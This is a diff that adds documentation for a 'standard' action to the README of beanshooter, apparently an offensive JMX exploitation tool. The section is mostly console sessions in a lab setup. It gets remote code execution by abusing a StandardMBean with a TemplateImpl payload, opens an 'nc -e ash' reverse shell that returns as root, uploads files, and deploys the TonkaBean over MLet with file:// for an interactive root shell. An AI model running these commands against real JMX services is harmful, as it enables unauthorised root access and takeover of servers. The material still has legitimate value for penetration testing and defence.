@@ -64,6 +64,7 @@ autocompletion.
     - [model](#model)
     - [serial](#serial)
     - [stager](#stager)
+    - [standard](#standard)
     - [undeploy](#undeploy)
   + [MBean Operations](#mbean-operations)
     - [generic](#generic-mbean-operations)
@@ -666,6 +667,112 @@ the `--class-name`, `--object-name` and `--jar-file` options are required.
 [+] Requested resource: /93691b8bae4143f087f7a3123641b20d
 [+] Sending jar file with md5sum: 6568ffb2934cb978dbd141848b8b128a
 ```
+
+#### Standard
+
+The `standard` action deploys a *StandardMBean* that implements the `TemplateImpl` class to achieve
+different targets. This technique was identified by [Markus Wulftange](https://twitter.com/mwulftange)
+and *beanshooter* implements it to allow command execution, file upload and *TonkaBean* deployment.
+
+```console
+[qtc@devbox ~]$ beanshooter standard 172.17.0.2 9010 exec 'nc 172.17.0.1 4444 -e ash'
+[+] Creating a TemplateImpl payload object to abuse StandardMBean
+[+]
+[+] 	Deplyoing MBean: StandardMBean
+[+] 	MBean with object name de.qtc.beanshooter:standard=3873612041699 was successfully deployed.
+[+]
+[+] 	Caught NullPointerException while invoking the newTransformer action.
+[+] 	This is expected bahavior and the attack most likely worked :)
+[+]
+[+] 	Removing MBean with ObjectName de.qtc.beanshooter:standard=3873612041699 from the MBeanServer.
+[+] 	MBean was successfully removed.
+...
+[qtc@devbox ~]$ nc -vlp 4444
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 172.17.0.2.
+Ncat: Connection from 172.17.0.2:40033.
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Command execution via the `standard` action is blind and you do not receive the output of your command.
+Moreover, by default you command is passed to `Runtime.exec(String str)`, which does not support special
+shell characters. If you want to use shell features, use the `--exec-array` option and specify your command
+like this: `'sh -c echo "my cool command" > /tmp/test.txt'`. However, it is generally more recommended to
+use the *TonkaBean* deployment for execution commands:
+
+```console
+[qtc@devbox ~]$ beanshooter standard 172.17.0.2 9010 tonka
+[+] Creating a TemplateImpl payload object to abuse StandardMBean
+[+]
+[+] 	Deplyoing MBean: StandardMBean
+[+] 	MBean with object name de.qtc.beanshooter:standard=4121868972140 was successfully deployed.
+[+]
+[+] 	Caught NullPointerException while invoking the newTransformer action.
+[+] 	This is expected bahavior and the attack most likely worked :)
+[+]
+[+] 	Removing MBean with ObjectName de.qtc.beanshooter:standard=4121868972140 from the MBeanServer.
+[+] 	MBean was successfully removed.
+[qtc@devbox ~]$ beanshooter tonka shell 172.17.0.2 9010
+[root@172.17.0.2 /]$ id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+The huge advantage compared to the regular `tonka deploy` action is that deployment via the *StandardMBean*
+does not require an outbound network connection. If a direct deployment via *StandardMBean* does not work,
+you may be able to upload the *TonkaBean* Jar file and load it via *MLet* and the `file://` protocol:
+
+```console
+[qtc@devbox ~]$ beanshooter tonka export --stager-url file:///tmp/
+[+] Exporting MBean jar file: ./tonka-bean-4.0.0-jar-with-dependencies.jar
+[+] Exporting MLet HTML file to: ./index.html
+[+] 	Class:     de.qtc.beanshooter.tonkabean.TonkaBean
+[+] 	Archive:   tonka-bean-4.0.0-jar-with-dependencies.jar
+[+] 	Object:    MLetTonkaBean:name=TonkaBean,id=1
+[+] 	Codebase:  file:/tmp/
+[qtc@devbox ~]$ beanshooter standard 172.17.0.2 9010 upload tonka-bean-4.0.0-jar-with-dependencies.jar:/tmp/tonka-bean-4.0.0-jar-with-dependencies.jar
+[+] Creating a TemplateImpl payload object to abuse StandardMBean
+[+]
+[+] 	Deplyoing MBean: StandardMBean
+[+] 	MBean with object name de.qtc.beanshooter:standard=4825542879735 was successfully deployed.
+[+]
+[+] 	Caught NullPointerException while invoking the newTransformer action.
+[+] 	This is expected bahavior and the attack most likely worked :)
+[+]
+[+] 	Removing MBean with ObjectName de.qtc.beanshooter:standard=4825542879735 from the MBeanServer.
+[+] 	MBean was successfully removed.
+[qtc@devbox ~]$ beanshooter standard 172.17.0.2 9010 upload index.html:/tmp/index.html
+[+] Creating a TemplateImpl payload object to abuse StandardMBean
+[+]
+[+] 	Deplyoing MBean: StandardMBean
+[+] 	MBean with object name de.qtc.beanshooter:standard=4836961801045 was successfully deployed.
+[+]
+[+] 	Caught NullPointerException while invoking the newTransformer action.
+[+] 	This is expected bahavior and the attack most likely worked :)
+[+]
+[+] 	Removing MBean with ObjectName de.qtc.beanshooter:standard=4836961801045 from the MBeanServer.
+[+] 	MBean was successfully removed.
+[qtc@devbox ~]$ beanshooter tonka deploy 172.17.0.2 9010 --stager-url file:///tmp/index.html
+[+] Starting MBean deployment.
+[+]
+[+] 	Deplyoing MBean: TonkaBean
+[+]
+[+] 		MBean class is not known by the server.
+[+] 		Starting MBean deployment.
+[+]
+[+] 			Deplyoing MBean: MLet
+[+] 			MBean with object name DefaultDomain:type=MLet was successfully deployed.
+[+]
+[+] 		Loading MBean from file:///tmp/index.html
+[+]
+[+] 	MBean with object name MLetTonkaBean:name=TonkaBean,id=1 was successfully deployed.
+```
+
+If you want to know more about the technique that is implemented by the `standard` action, I highly
+recommend [this blog post](TODO) by [CODE WHITE](https://www.code-white.com/en/) which explains it
+in great detail.
 
 #### Undeploy
 
